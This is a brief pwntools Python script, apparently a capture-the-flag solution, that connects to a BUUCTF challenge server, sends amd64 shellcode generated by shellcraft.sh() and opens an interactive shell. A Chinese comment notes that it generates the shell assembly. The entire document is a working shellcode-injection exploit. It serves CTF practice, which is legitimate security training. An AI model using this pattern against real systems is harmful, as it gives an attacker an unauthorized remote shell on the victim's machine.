from pwn import *
context(log_level='debug',os='linux',arch='amd64')
p=remote("node5.buuoj.cn",29396)

shellcode=asm(shellcraft.sh()) #生成shell代码，生成一段汇编代码execute汇编代码，
p.sendline(shellcode)
p.interactive()